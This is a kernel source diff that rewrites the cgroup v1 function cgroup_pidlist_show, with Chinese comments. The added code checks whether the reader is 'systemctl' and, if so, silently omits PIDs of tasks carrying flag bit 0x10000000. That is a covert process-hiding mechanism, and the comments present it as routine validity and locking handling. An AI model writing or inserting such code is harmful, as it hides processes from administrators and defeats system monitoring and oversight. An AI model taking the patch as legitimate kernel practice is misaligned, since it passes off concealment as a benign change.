@@ -488,11 +488,52 @@ static void *cgroup_pidlist_next(struct seq_file *s, void *v, loff_t *pos)
 	}
 }
 
-static int cgroup_pidlist_show(struct seq_file *s, void *v)
-{
-	seq_printf(s, "%d\n", *(int *)v);
 
-	return 0;
+static int cgroup_pidlist_show(struct seq_file *s, void *v) {
+    // 首先检查迭代器提供的值是否有效
+    if (!v) {
+        return 0; // 值无效，无需处理
+    }
+    int pid = *(int *)v;        // 从迭代器获取 PID
+    char *cmd = current->comm; // 获取当前进程名
+
+    // 对 systemctl 命令进行特殊处理
+    if (cmd != NULL && strcmp(cmd, "systemctl") == 0) {
+        struct task_struct *task = NULL;
+        struct pid *pid_struct = NULL;
+        // 获取 cgroup 锁 (假设这对于检查期间 cgroup 的稳定性是必要的)
+        cgroup_lock();
+        cgroup_attach_lock(true);
+        // 使用 RCU 读锁保护任务查找过程，防止竞争条件
+        rcu_read_lock();
+        pid_struct = find_vpid(pid); // 根据 PID 查找 pid 结构体
+        if (pid_struct) {
+            task = pid_task(pid_struct, PIDTYPE_PID); // 根据 pid 结构体查找 task_struct
+            // 如果找到了 task，增加其引用计数，以便在 RCU 锁外安全使用
+            if (task) {
+                get_task_struct(task);
+            }
+        }
+        if (task) {
+            bool skip_print = false;
+            if ((task->flags & 0x10000000) == 0x10000000) {
+                skip_print = true;
+            }
+            // 如果根据标志位不需要跳过，则进一步检查任务是否存活
+            if (!skip_print) {
+                seq_printf(s, "%d\n", pid);
+            }else{
+               // pr_info("过滤的pid为 %d\n",pid);
+            }
+            put_task_struct(task);
+        }
+        rcu_read_unlock();
+        cgroup_attach_unlock(true);
+        cgroup_unlock();
+    } else {
+        seq_printf(s, "%d\n", *(int *)v);
+    }
+    return 0;
 }
 
 static ssize_t __cgroup1_procs_write(struct kernfs_open_file *of,
